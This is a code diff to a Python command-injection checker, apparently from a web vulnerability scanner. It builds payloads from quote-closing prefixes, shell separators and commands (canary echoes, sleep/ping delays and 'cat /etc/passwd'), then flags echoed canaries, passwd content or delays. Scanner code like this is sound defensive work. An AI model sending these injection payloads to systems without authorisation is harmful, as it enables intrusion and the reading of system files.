@@ -1,4 +1,4 @@
-"""Command Injection checker — differential echo + time-based detection."""
+"""Command Injection checker — multi-OS prefix/suffix combinator with echo + time detection."""
 
 import re
 from typing import Optional, List
@@ -18,53 +18,81 @@ class CMDi(BaseChecker):
         self.time_margin = time_margin
         self.canary = self.rand(10)
 
+        self.payloads_list = self._build_payloads()
+        self._canary_rx = re.compile(re.escape(self.canary))
+
+    def _build_payloads(self) -> List[str]:
+        """Build CMDi payloads using prefix × separator × command combinator."""
         c = self.canary
         s = self.sleep_s
+        out: list[str] = []
 
-        separators = [";", "|", "||", "&&"]
-        unix_echo = [f"echo {c}", f"printf {c}"]
-        unix_sleep = [f"sleep {s}", f"ping -c {s} 127.0.0.1"]
+        # ── Closing prefixes (break out of quotes/context) ──
+        prefixes = ["", "'", '"', ")", "$(", "`"]
+
+        # ── Separators (chain commands) ──
+        separators = [";", "|", "||", "&&", "\n", "%0a"]
+
+        # ── Unix echo commands (output-based detection) ──
+        unix_echo = [
+            f"echo {c}",
+            f"printf {c}",
+            f"echo {c} #",
+            f"cat /etc/passwd",  # signature file
+        ]
+
+        # ── Unix sleep commands (time-based detection) ──
+        unix_sleep = [
+            f"sleep {s}",
+            f"ping -c {s} 127.0.0.1",
+        ]
+
+        # ── Windows echo commands ──
         win_echo = [f"echo {c}"]
-        win_sleep = [f"timeout /T {s}", f"ping -n {s} 127.0.0.1 >NUL"]
 
-        payloads = set()
+        # ── Windows sleep commands ──
+        win_sleep = [
+            f"timeout /T {s}",
+            f"ping -n {s} 127.0.0.1 >NUL",
+        ]
 
-        # Unix: echo (output-based)
+        # ── 1. Separator-based injection ──
+        for prefix in prefixes:
+            for sep in separators:
+                for cmd in unix_echo:
+                    out.append(f"{prefix}{sep}{cmd}")
+                for cmd in unix_sleep:
+                    out.append(f"{prefix}{sep}{cmd}")
+                for cmd in win_echo:
+                    out.append(f"{prefix}{sep}{cmd}")
+                for cmd in win_sleep:
+                    out.append(f"{prefix}{sep}{cmd}")
+
+        # ── 2. Command substitution (backtick / $()) ──
         for cmd in unix_echo:
-            for sep in separators:
-                payloads.add(f"{sep}{cmd}")
-            payloads.add(f"`{cmd}`")
-            payloads.add(f"$({cmd})")
-            payloads.add(f"\n{cmd}")
-
-        # Unix: sleep (time-based)
+            out.append(f"`{cmd}`")
+            out.append(f"$({cmd})")
         for cmd in unix_sleep:
-            for sep in separators:
-                payloads.add(f"{sep}{cmd}")
-            payloads.add(f"`{cmd}`")
-            payloads.add(f"$({cmd})")
-            payloads.add(f"\n{cmd}")
+            out.append(f"`{cmd}`")
+            out.append(f"$({cmd})")
 
-        # Windows: echo
-        for cmd in win_echo:
-            for sep in separators:
-                payloads.add(f"{sep}{cmd}")
+        # ── 3. Quoted prefix + substitution ──
+        for q in ["'", '"']:
+            for cmd in unix_echo:
+                out.append(f"{q}`{cmd}`")
+                out.append(f"{q}$({cmd})")
+            for cmd in unix_sleep:
+                out.append(f"{q}`{cmd}`")
+                out.append(f"{q}$({cmd})")
 
-        # Windows: sleep
-        for cmd in win_sleep:
-            for sep in separators:
-                payloads.add(f"{sep}{cmd}")
-
-        # Add variants with quote-closing prefixes
-        quotes = ["'", '"', ")"]
-        enriched = set()
-        for p in payloads:
-            enriched.add(p)
-            for q in quotes:
-                enriched.add(q + p)
-
-        self.payloads_list = list(enriched)
-        self._canary_rx = re.compile(re.escape(self.canary))
+        # Deduplicate preserving order
+        seen = set()
+        unique = []
+        for p in out:
+            if p not in seen:
+                seen.add(p)
+                unique.append(p)
+        return unique
 
     def get_payloads(self) -> List[str]:
         return self.payloads_list
@@ -83,7 +111,19 @@ class CMDi(BaseChecker):
                 evidence=f"Canary '{self.canary}' reflected in response",
             )
 
-        # ── 2. Time-based (differential) ──
+        # ── 2. /etc/passwd detection (differential) ──
+        passwd_rx = re.compile(r"root:x:0:0:")
+        if passwd_rx.search(body) and not passwd_rx.search(baseline.body):
+            return CheckResult(
+                vuln_name=self.name,
+                severity="critical",
+                confidence="confirmed",
+                location="", param="", payload=payload,
+                status_code=response.status_code,
+                evidence="Command output: /etc/passwd content detected",
+            )
+
+        # ── 3. Time-based (differential) ──
         try:
             elapsed = response.elapsed.total_seconds()
             threshold = baseline.elapsed + self.sleep_s - self.time_margin
